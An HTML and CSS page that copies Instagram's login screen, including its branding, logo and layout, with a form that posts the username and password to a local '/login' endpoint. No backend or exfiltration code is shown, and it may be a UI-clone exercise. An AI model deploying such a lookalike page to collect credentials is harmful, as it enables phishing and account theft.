<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        body {
            background-color: #fafafa;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
        }
        .login-box {
            background: #fff;
            padding: 20px;
            border: 1px solid #dbdbdb;
            width: 350px;
            text-align: center;
        }
        .login-box img {
            width: 180px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
        }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 10px 0;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider span {
            padding: 0 10px;
            color: #8e8e8e;
            font-size: 12px;
        }
        .signup-link {
            margin-top: 10px;
            font-size: 14px;
        }
        .signup-link a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Instagram">
            <form action="/login" method="post">
                <input type="text" class="input-field" placeholder="Phone number, username, or email" name="username">
                <input type="password" class="input-field" placeholder="Password" name="password">
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="divider"><span>OR</span></div>
            <a href="#" style="color: #385185; font-weight: bold; font-size: 14px;"><i class="fa-brands fa-facebook"></i> Log in with Facebook</a>
            <p style="margin-top: 10px;"><a href="#" style="color: #00376b; font-size: 12px;">Forgot password?</a></p>
        </div>
        <div class="login-box" style="margin-top: 10px;">
            <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
